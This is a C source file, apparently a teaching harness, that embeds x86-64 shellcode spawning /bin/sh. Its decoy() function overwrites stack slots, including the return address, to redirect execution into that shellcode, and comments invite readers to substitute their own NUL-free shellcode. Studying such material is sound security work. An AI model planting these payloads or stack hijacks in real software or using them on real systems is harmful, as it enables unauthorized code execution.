#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <malloc.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

long long  *hold;
//used command "disas /r _start" to get Hex Code values for assembly
char shellcode[] = "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x11"
"\x48\xc1\xe7\x08"
"\x48\xc1\xef\x08"
"\x57"
"\x48\x89\xe7"
"\x48\x31\xc0"
"\x48\x31\xf6"
"\x48\x31\xd2"
"\xb0\x3b"
"\x0f\x05"
"\x00";

//Replace the above shellcod buffer operations with the hex code for you shell code.
//NOTE: Make sure it is null terminated, but otherwise has no NULL characters embedded.

void decoy(char *cx)

{
	long long *ret;

	hold= (long long *)&ret;
	(*hold)=(long long)cx;
	hold++;
	(*hold)=(long long)cx;
	hold++;
	(*hold)=(long long)cx;
	hold++;
	(*hold)=(long long)cx;
	hold++;
	(*hold)=(long long)cx;
	hold++;
	(*hold)=(long long)cx;

}

void main ()
{  
	int pagesize;
	char *buf;

	pagesize = sysconf(_SC_PAGE_SIZE);
	posix_memalign(&buf, pagesize, strlen(shellcode)+10);
	//puts(shellcode);
	strcpy(buf,shellcode);
	//puts(buf);
	//mprotect(buf, strlen(shellcode)+10, PROT_EXEC|PROT_WRITE|PROT_READ);
	decoy(buf);  
	return;  
}























